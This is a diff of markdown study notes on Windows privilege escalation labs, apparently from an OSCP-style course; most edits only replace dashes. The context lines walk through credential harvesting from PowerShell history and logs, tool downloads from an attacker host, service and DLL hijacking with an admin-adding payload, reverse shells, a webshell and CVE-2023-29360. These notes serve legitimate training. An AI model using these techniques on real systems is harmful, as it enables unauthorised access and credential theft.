@@ -303,7 +303,7 @@ evil-winrm -i <target-ip> -u <username> -p "<password>"
 
 **VM #2 (CLIENTWK221, RDP as mac / IAmTheGOATSysAdmin!):**
 - `Get-ChildItem -Path C:\Users\ -Include *.ini,...` → `C:\Users\Public\Documents\install.ini` (376 bytes)
-- File comment: `# They don't know anything about computers!!` — then a base64-encoded UTF-16LE blob
+- File comment: `# They don't know anything about computers!!`, then a base64-encoded UTF-16LE blob
 - Decoded with `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`:
   ```json
   {
@@ -416,7 +416,7 @@ flowchart TD
 - PSReadline history: `type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
   - Found: `Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager` (KeePass password in plaintext)
   - Found: `Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"` (transcript path)
-  - `Clear-History` was run — but PSReadline file survived it (key lesson)
+  - `Clear-History` was run, but PSReadline file survived it (key lesson)
 - Transcript: `type C:\Users\Public\Transcripts\transcript01.txt`
   - Contains: `$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force`
   - Contains: `$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)`
@@ -431,7 +431,7 @@ flowchart TD
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object -ExpandProperty Message | Select-String -Pattern "password|Password|SecureString|Credential|secret|Secret"
   ```
-- Hit: an `iwr` command with a Basic auth header — password visible in plaintext before encoding:
+- Hit: an `iwr` command with a Basic auth header, password visible in plaintext before encoding:
   ```powershell
   iwr -uri http://192.168.50.120 -Headers @{ Authorization = "Basic " +
   [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("dave:ThereIsNoSecretCowLevel1337"))
@@ -441,9 +441,9 @@ flowchart TD
 
 > 🔍 **Worth remembering generally:** `Clear-History` only clears `Get-History` (the in-session buffer). The PSReadline file (`ConsoleHost_history.txt`) is a separate persistent store that survives `Clear-History`, logout, and reboots. Most sysadmins don't know this distinction. Always check both.
 
-> 🔍 **Worth remembering generally:** transcription started before a `Enter-PSSession` with `$cred` captures the full credential construction — `ConvertTo-SecureString` with the plaintext string is right there in the file. The transcript records what was typed AND what was output, in order.
+> 🔍 **Worth remembering generally:** transcription started before a `Enter-PSSession` with `$cred` captures the full credential construction, `ConvertTo-SecureString` with the plaintext string is right there in the file. The transcript records what was typed AND what was output, in order.
 
-> 🔍 **Worth remembering generally:** Script Block Logging captures source code *before* execution — so even when a script tries to hide a password by base64-encoding it (e.g. for a Basic auth header), the plaintext string appears verbatim in Event ID 4104. Encoding after the fact doesn't hide it from the log.
+> 🔍 **Worth remembering generally:** Script Block Logging captures source code *before* execution, so even when a script tries to hide a password by base64-encoding it (e.g. for a Basic auth header), the plaintext string appears verbatim in Event ID 4104. Encoding after the fact doesn't hide it from the log.
 
 > 📸 Screenshot: PSReadline history file showing `Set-Secret` with KeePass password and `Start-Transcript` path
 > 📸 Screenshot: transcript file showing `ConvertTo-SecureString "qwertqwertqwert123!!"` and PSCredential lines
@@ -452,10 +452,10 @@ flowchart TD
 
 **VM #2 (CLIENTWK221, RDP as mac / IAmTheGOATSysAdmin!):**
 - `type (Get-PSReadlineOption).HistorySavePath` → flag was sitting directly in the PSReadline history as a previously-typed command
-- Someone had pasted/typed the flag string directly into the PowerShell prompt at some point — PSReadline logged it like any other input
+- Someone had pasted/typed the flag string directly into the PowerShell prompt at some point. PSReadline logged it like any other input
 - Flag: **`OS{17c49c88efb309356ac36871cf778957}`**
 
-> 🔍 **Worth remembering generally:** PSReadline doesn't just log commands that run successfully — it logs everything typed, including accidental pastes, mistyped commands, and raw strings entered into the prompt. A sysadmin pasting a password into the wrong window gets it permanently saved to the history file.
+> 🔍 **Worth remembering generally:** PSReadline doesn't just log commands that run successfully, it logs everything typed, including accidental pastes, mistyped commands, and raw strings entered into the prompt. A sysadmin pasting a password into the wrong window gets it permanently saved to the history file.
 
 #### Tags: #PSReadline #PowerShellHistory #PowerShellTranscription #ScriptBlockLogging #EvilWinRM #Module17
 
@@ -515,30 +515,30 @@ Get-ModifiablePath          # Writable paths in DLL search order
 
 **VM #1 (CLIENTWK220, bind shell port 4444):**
 
-*winPEAS — DPAPI Masterkeys:*
+*winPEAS. DPAPI Masterkeys:*
 - Served winPEAS from Kali: `cp /usr/share/peass/winpeas/winPEASx64.exe . && python3 -m http.server 80`
 - Downloaded to target: `powershell iwr -uri http://192.168.45.159/winPEASx64.exe -Outfile C:\Users\dave\winPEAS.exe`
-- Ran with output redirect: `C:\Users\dave\winPEAS.exe > C:\Users\dave\winpeas_out.txt 2>&1` (~2m40s, bind shell drops after — reconnect and search the file)
+- Ran with output redirect: `C:\Users\dave\winPEAS.exe > C:\Users\dave\winpeas_out.txt 2>&1` (~2m40s, bind shell drops after, reconnect and search the file)
 - Searched output: `findstr /i "masterkey" C:\Users\dave\winpeas_out.txt`
 - Found 6 DPAPI masterkeys under dave's Protect store (SID S-1-5-21-2309961351-4093026482-2223492918-1002)
 - Lab answer (full path format required, not just GUID):
   **`MasterKey: C:\Users\dave\AppData\Roaming\Microsoft\Protect\S-1-5-21-2309961351-4093026482-2223492918-1002\7ba528f7-4e73-48a3-8a67-e5680688c9ff`**
 
-*Seatbelt — XAMPP DisplayVersion:*
+*Seatbelt. XAMPP DisplayVersion:*
 - Precompiled Seatbelt available on Kali at `/home/kali/tools/exploit/SharpCollection/NetFramework_4.5_x64/Seatbelt.exe`
 - Served and downloaded same way as winPEAS
-- Ran: `C:\Users\dave\Seatbelt.exe -group=all > C:\Users\dave\seatbelt_out.txt 2>&1` (~58s, shell drops — reconnect)
+- Ran: `C:\Users\dave\Seatbelt.exe -group=all > C:\Users\dave\seatbelt_out.txt 2>&1` (~58s, shell drops, reconnect)
 - `findstr /i "xampp" seatbelt_out.txt` found DisplayName but not DisplayVersion in context
 - Used `powershell "Select-String -Path C:\Users\dave\seatbelt_out.txt -Pattern 'XAMPP' -Context 5,5"` to show surrounding lines
 - InstalledProducts section (line 905-906): `DisplayName: XAMPP` / **`DisplayVersion: 7.4.29-1`**
 - Lab answer: **`7.4.29-1`**
-- Bonus: Seatbelt also surfaced a meeting notes AutoSummary (line 3906) containing `securityIsNotAnOption++++++` — same credential found manually in 17.1.3, confirming tools and manual work complement each other
+- Bonus: Seatbelt also surfaced a meeting notes AutoSummary (line 3906) containing `securityIsNotAnOption++++++`, same credential found manually in 17.1.3, confirming tools and manual work complement each other
 
-> 🔧 **Technique:** the lab answer requires the full `MasterKey: C:\Users\...\<GUID>` path format — submitting just the bare GUID is rejected. Copy the full line from winPEAS output.
+> 🔧 **Technique:** the lab answer requires the full `MasterKey: C:\Users\...\<GUID>` path format, submitting just the bare GUID is rejected. Copy the full line from winPEAS output.
 
-> 🔍 **Worth remembering generally:** bind shells sometimes drop after a long-running process like winPEAS/Seatbelt completes. Redirect output to a file first (`> out.txt 2>&1`), reconnect, then search the file — much more reliable than trying to capture live scrolling output over nc.
+> 🔍 **Worth remembering generally:** bind shells sometimes drop after a long-running process like winPEAS/Seatbelt completes. Redirect output to a file first (`> out.txt 2>&1`), reconnect, then search the file, much more reliable than trying to capture live scrolling output over nc.
 
-> 🔍 **Worth remembering generally:** `findstr` shows matching lines with no context. For "find the nearby field" problems, use `Select-String -Context N,N` in PowerShell instead — it shows N lines before and after each match.
+> 🔍 **Worth remembering generally:** `findstr` shows matching lines with no context. For "find the nearby field" problems, use `Select-String -Context N,N` in PowerShell instead, it shows N lines before and after each match.
 
 > 📸 Screenshot: winPEAS DPAPI Masterkeys section showing the six keys under dave's Protect store
 > 📸 Screenshot: Seatbelt InstalledProducts section showing XAMPP DisplayVersion 7.4.29-1
@@ -674,7 +674,7 @@ Install-ServiceBinary -Name 'mysql'
 
 **VM #1 (CLIENTWK220, RDP as dave:lab):**
 - `Get-CimInstance -ClassName win32_service` → found `mysql` running from `C:\xampp\mysql\bin\mysqld.exe`
-- `icacls "C:\xampp\mysql\bin\mysqld.exe"` → `BUILTIN\Users:(F)` — full write access for all users
+- `icacls "C:\xampp\mysql\bin\mysqld.exe"` → `BUILTIN\Users:(F)`, full write access for all users
 - Confirmed `StartMode: Auto` and `SeShutdownPrivilege` available to dave
 - Compiled malicious binary on Kali: `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
   - Creates `dave2:password123!` and adds to local Administrators
@@ -702,9 +702,9 @@ Install-ServiceBinary -Name 'mysql'
 - `Restart-Service BackupMonitor` → shell caught as `clientwk221\roy`
 - Flag: **`OS{652e043d55c7ff94a2e33ae74937e21d}`** at `C:\Users\roy\Desktop\flag.txt`
 
-> 🔍 **Worth remembering generally:** when the service runs as a named user (not SYSTEM), use a reverse shell payload rather than adduser.exe — you need a shell as that specific user to access their files. adduser only helps when the service runs as SYSTEM/admin and you need lateral movement.
+> 🔍 **Worth remembering generally:** when the service runs as a named user (not SYSTEM), use a reverse shell payload rather than adduser.exe, you need a shell as that specific user to access their files. adduser only helps when the service runs as SYSTEM/admin and you need lateral movement.
 
-> 🔁 Similar to: [[Antivirus Evasion#Shellter]] — payload delivery via binary replacement; the shell catches in the same nc listener pattern.
+> 🔁 Similar to: [[Antivirus Evasion#Shellter]], payload delivery via binary replacement; the shell catches in the same nc listener pattern.
 
 #### Tags: #ServiceBinaryHijacking #icacls #mingw #Windows #PrivilegeEscalation #Module17
 
@@ -811,7 +811,7 @@ net localgroup administrators  # look for dave3
 **Lab status: ✅ Completed (VM #1)**
 
 **VM #1 (CLIENTWK220, RDP as dave:lab):**
-- Skipped Process Monitor — DLL name already known from module: `TextShaping.dll` missing from `C:\FileZilla\FileZilla FTP Client\`
+- Skipped Process Monitor. DLL name already known from module: `TextShaping.dll` missing from `C:\FileZilla\FileZilla FTP Client\`
 - Confirmed write access: `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'` → worked
 - Compiled malicious DLL on Kali:
   ```bash
@@ -820,11 +820,11 @@ net localgroup administrators  # look for dave3
   Payload: creates `dave3:password123!` as local admin on `DLL_PROCESS_ATTACH`
 - Planted: `iwr -uri http://192.168.45.159/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`
 - Waited ~2 minutes for daveadmin's scheduled task to launch FileZilla
-- Polled with `net user dave3` — user appeared once scheduled task fired
+- Polled with `net user dave3`, user appeared once scheduled task fired
 - `evil-winrm -i 192.168.206.220 -u dave3 -p 'password123!'` → shell as local admin
 - Flag: **`OS{32667176bc11f88de10aa41735170de4}`** at `C:\Users\daveadmin\Desktop\flag.txt`
 
-> 🔍 **Worth remembering generally:** DLL hijacking is a waiting game when the trigger is a scheduled task — unlike service binary hijacking where you control the restart. Don't try to force it; just poll `net user <newuser>` every 60 seconds. If nothing after 5 minutes, suspect a flaky task and revert.
+> 🔍 **Worth remembering generally:** DLL hijacking is a waiting game when the trigger is a scheduled task, unlike service binary hijacking where you control the restart. Don't try to force it; just poll `net user <newuser>` every 60 seconds. If nothing after 5 minutes, suspect a flaky task and revert.
 
 > 🔍 **Worth remembering generally:** the `--shared` flag is what makes mingw produce a DLL instead of an EXE. Forgetting it produces an EXE that won't load as a DLL and the hijack silently fails.
 
@@ -976,9 +976,9 @@ Dave can't start the service. Trying `runas /user:daveadmin cmd` and then `sc st
 BUILTIN\Administrators   Group used for deny only
 ```
 
-When a non-admin user does `runas /user:<local-admin>`, Windows creates a process with a *filtered* (standard) token — the Administrators SID is present but marked "deny only." The SCM access check fails because the token can't satisfy the RP (start) ACE for Administrators. This is UAC token filtering at work, not a permissions problem.
+When a non-admin user does `runas /user:<local-admin>`, Windows creates a process with a *filtered* (standard) token, the Administrators SID is present but marked "deny only." The SCM access check fails because the token can't satisfy the RP (start) ACE for Administrators. This is UAC token filtering at work, not a permissions problem.
 
-> 🔍 **Worth remembering generally:** `runas /user:<local-admin>` from a standard-user session gives a filtered, non-elevated token — exactly like a user clicking a normal shortcut while logged in as an admin. To get an elevated token locally you need an interactive session (RDP in directly) or UAC consent (right-click Run as Administrator). Over the network, evil-winrm/PSRemoting also give filtered tokens unless `LocalAccountTokenFilterPolicy=1` in the registry.
+> 🔍 **Worth remembering generally:** `runas /user:<local-admin>` from a standard-user session gives a filtered, non-elevated token, exactly like a user clicking a normal shortcut while logged in as an admin. To get an elevated token locally you need an interactive session (RDP in directly) or UAC consent (right-click Run as Administrator). Over the network, evil-winrm/PSRemoting also give filtered tokens unless `LocalAccountTokenFilterPolicy=1` in the registry.
 
 **Finding who CAN start the service:**
 
@@ -990,7 +990,7 @@ wmic useraccount where "SID='S-1-5-21-2309961351-4093026482-2223492918-1003'" ge
 REM → steve
 ```
 
-Steve has *explicit* start rights in the SDDL — no group involved, so no token filtering applies. Steve's password (`securityIsNotAnOption++++++`) was found during 17.1.3.
+Steve has *explicit* start rights in the SDDL, no group involved, so no token filtering applies. Steve's password (`securityIsNotAnOption++++++`) was found during 17.1.3.
 
 **Trigger and catch:**
 ```cmd
@@ -1004,7 +1004,7 @@ REM Enter: securityIsNotAnOption++++++
 clientwk220> whoami → nt authority\system
 ```
 
-> 🔁 **Similar to:** [[Windows Privilege Escalation#17.2.1. Service Binary Hijacking|17.2.1]] — same payload delivery and catch flow. The only difference is WHERE the binary is placed (path resolution slot vs. the actual service binary directory) and WHO triggers the restart.
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.2.1. Service Binary Hijacking|17.2.1]], same payload delivery and catch flow. The only difference is WHERE the binary is placed (path resolution slot vs. the actual service binary directory) and WHO triggers the restart.
 
 > 📸 Screenshot: `wmic service get name,pathname` showing GammaService unquoted path
 > 📸 Screenshot: `icacls "C:\Program Files\Enterprise Apps"` showing BUILTIN\Users RX,W
@@ -1062,7 +1062,7 @@ clientwk221> whoami → clientwk221\roy
 
 The shell comes back as `roy` (the service account), not SYSTEM. The flag is on roy's desktop.
 
-> 🔍 **Worth remembering generally:** not every service runs as SYSTEM. Always check `SERVICE_START_NAME` in `sc qc` before deciding whether the escalation path is worth pursuing. A service running as a low-priv domain account or local user might still be useful — access to that account's files, credentials, or lateral movement opportunities.
+> 🔍 **Worth remembering generally:** not every service runs as SYSTEM. Always check `SERVICE_START_NAME` in `sc qc` before deciding whether the escalation path is worth pursuing. A service running as a low-priv domain account or local user might still be useful, access to that account's files, credentials, or lateral movement opportunities.
 
 > 📸 Screenshot: `wmic service get name,pathname` showing ReynhSurveillance unquoted path
 > 📸 Screenshot: `icacls "C:\Enterprise Software\Monitoring Solution"` showing damian RX,W
@@ -1207,7 +1207,7 @@ Get-ScheduledTask | ForEach-Object {
 # → TaskName: Voice Activation | RunAs: roy | Execute: C:\Users\moss\Searches\VoiceActivation.exe
 ```
 
-**Write access:** moss owns `C:\Users\moss\Searches\` — full control by default over your own profile. No extra icacls check needed.
+**Write access:** moss owns `C:\Users\moss\Searches\`, full control by default over your own profile. No extra icacls check needed.
 
 **Payload delivery (from RDP session as moss):**
 
@@ -1223,9 +1223,9 @@ Within 60 seconds the task fires, executes VoiceActivation.exe as roy, and the s
 whoami → clientwk221\roy
 ```
 
-> 🔍 **Worth remembering generally:** when the task runs as a non-SYSTEM, non-admin user (roy here), you escalate to that account specifically — useful for accessing their files, credentials, or lateral movement, but not automatically SYSTEM. Check `sc qc` / `schtasks` "Run As User" early so you know the payoff before investing time.
+> 🔍 **Worth remembering generally:** when the task runs as a non-SYSTEM, non-admin user (roy here), you escalate to that account specifically, useful for accessing their files, credentials, or lateral movement, but not automatically SYSTEM. Check `sc qc` / `schtasks` "Run As User" early so you know the payoff before investing time.
 
-> 🔁 **Similar to:** [[Windows Privilege Escalation#17.3.1. Scheduled Tasks|VM#1]] — identical attack, just with a different task name and user. The PowerShell `Get-ScheduledTask` enumeration approach is cleaner than `schtasks /query /fo LIST /v | findstr` for this kind of discovery.
+> 🔁 **Similar to:** [[Windows Privilege Escalation#17.3.1. Scheduled Tasks|VM#1]], identical attack, just with a different task name and user. The PowerShell `Get-ScheduledTask` enumeration approach is cleaner than `schtasks /query /fo LIST /v | findstr` for this kind of discovery.
 
 > 📸 Screenshot: PowerShell Get-ScheduledTask output showing Voice Activation task with roy as run-as user
 > 📸 Screenshot: nc listener receiving shell as clientwk221\roy
@@ -1326,9 +1326,9 @@ net localgroup Administrators
 
 #### Lab — VM #1: CLIENTWK220 (RDP as steve:securityIsNotAnOption++++++) ✅
 
-**Exploit:** `CVE-2023-29360.exe` — pre-staged on steve's Desktop by the lab.
+**Exploit:** `CVE-2023-29360.exe`, pre-staged on steve's Desktop by the lab.
 
-**Access:** Steve is in Remote Management Users (evil-winrm works) but the exploit spawns an interactive cmd.exe — that needs a proper interactive RDP session to be usable. evil-winrm runs the exploit fine but the spawned SYSTEM cmd.exe has no interactive stdin in that context and exits immediately. RDP gives a real desktop where the SYSTEM cmd.exe pops as a usable window.
+**Access:** Steve is in Remote Management Users (evil-winrm works) but the exploit spawns an interactive cmd.exe, that needs a proper interactive RDP session to be usable. evil-winrm runs the exploit fine but the spawned SYSTEM cmd.exe has no interactive stdin in that context and exits immediately. RDP gives a real desktop where the SYSTEM cmd.exe pops as a usable window.
 
 ```powershell
 # In RDP session as steve:
@@ -1356,7 +1356,7 @@ C:\Users\steve\Desktop> whoami → nt authority\system
 #### Lab — VM #2: CLIENTWK220 (RDP as dave:lab + PHP webshell) ✅
 
 **Intended path:** SeImpersonatePrivilege → SigmaPotato → SYSTEM
-**Actual outcome:** Apache already runs as `NT AUTHORITY\SYSTEM` in this XAMPP install — webshell gives SYSTEM directly.
+**Actual outcome:** Apache already runs as `NT AUTHORITY\SYSTEM` in this XAMPP install, webshell gives SYSTEM directly.
 
 **Attack chain:**
 
@@ -1368,11 +1368,11 @@ C:\Users\steve\Desktop> whoami → nt authority\system
 5. curl "http://192.168.137.220/shell.php?cmd=type+C:\Users\daveadmin\Desktop\flag.txt" → flag
 ```
 
-**Why SYSTEM without SigmaPotato:** XAMPP defaults to running Apache as LocalSystem unless reconfigured. When Apache IS LocalSystem, webshell code execution is already SYSTEM — SeImpersonatePrivilege / Potato tools are only needed when the service runs as a lower-priv account (NETWORK SERVICE, IIS APPPOOL\DefaultAppPool, etc.) that has SeImpersonatePrivilege but not direct SYSTEM rights.
+**Why SYSTEM without SigmaPotato:** XAMPP defaults to running Apache as LocalSystem unless reconfigured. When Apache IS LocalSystem, webshell code execution is already SYSTEM. SeImpersonatePrivilege / Potato tools are only needed when the service runs as a lower-priv account (NETWORK SERVICE, IIS APPPOOL\DefaultAppPool, etc.) that has SeImpersonatePrivilege but not direct SYSTEM rights.
 
-> 🔍 **Worth remembering generally:** always `whoami` immediately after landing a webshell. If Apache/IIS runs as SYSTEM, stop there — escalation is already done. If it runs as NETWORK SERVICE or an app pool identity, THEN reach for SigmaPotato/GodPotato. The `whoami /priv` output will show `SeImpersonatePrivilege` in the latter case.
+> 🔍 **Worth remembering generally:** always `whoami` immediately after landing a webshell. If Apache/IIS runs as SYSTEM, stop there, escalation is already done. If it runs as NETWORK SERVICE or an app pool identity, THEN reach for SigmaPotato/GodPotato. The `whoami /priv` output will show `SeImpersonatePrivilege` in the latter case.
 
-> 🔍 **Worth remembering generally:** `NT AUTHORITY\Authenticated Users` with Modify (`M`) covers any logged-in user — domain or local. If a web root has this ACL, any authenticated user can drop files into it directly without needing admin rights.
+> 🔍 **Worth remembering generally:** `NT AUTHORITY\Authenticated Users` with Modify (`M`) covers any logged-in user, domain or local. If a web root has this ACL, any authenticated user can drop files into it directly without needing admin rights.
 
 > 📸 Screenshot: `icacls C:\xampp\htdocs` showing Authenticated Users Modify
 > 📸 Screenshot: curl output showing `nt authority\system` from whoami webshell call
@@ -1678,7 +1678,7 @@ flowchart TD
 - [x] **17.1.5 Automated Enumeration:** done (winPEAS, PowerUp, Seatbelt coverage, limitations noted)
 - [x] **17.2.1 Service Binary Hijacking:** done (icacls masks, adduser.c, mingw compile, reboot approach, PowerUp AbuseFunction and its known bug)
 - [x] **17.2.2 DLL Hijacking:** done (DLL search order diagram, Process Monitor workflow, DllMain template, missing DLL detection, --shared compile)
-- [x] **17.2.3 Unquoted Service Paths:** done (path resolution sequence diagram, wmic command, icacls check, PowerUp Get-UnquotedService + Write-ServiceBinary; VM#1 flag OS{0b3c0403ab9fc3ba56de4bea2fcd8634} — SYSTEM via steve's explicit SDDL start rights + UAC token filtering lesson; VM#2 flag OS{ec55ff1679fdca9cd15a087e725dd394} — shell as roy)
+- [x] **17.2.3 Unquoted Service Paths:** done (path resolution sequence diagram, wmic command, icacls check, PowerUp Get-UnquotedService + Write-ServiceBinary; VM#1 flag OS{0b3c0403ab9fc3ba56de4bea2fcd8634}. SYSTEM via steve's explicit SDDL start rights + UAC token filtering lesson; VM#2 flag OS{ec55ff1679fdca9cd15a087e725dd394}, shell as roy)
 - [x] **17.3.1 Scheduled Tasks:** done (three key questions, schtasks enumeration, binary replacement attack, timing considerations)
 - [x] **17.3.2 Using Exploits:** done (three exploit categories, CVE-2023-29360 workflow, SeImpersonatePrivilege + named pipes architecture, SigmaPotato usage, Potato family overview; Capstone CLIENTWK222 flag OS{55a5eb25425fe0875c37038779dc8077} -- CVE-2023-28252 CLFS from diana's nc shell, DLL planted but no restart trigger found)
 - [x] **17.4 Wrapping Up:** done (full decision flowchart, external resources, related boxes)
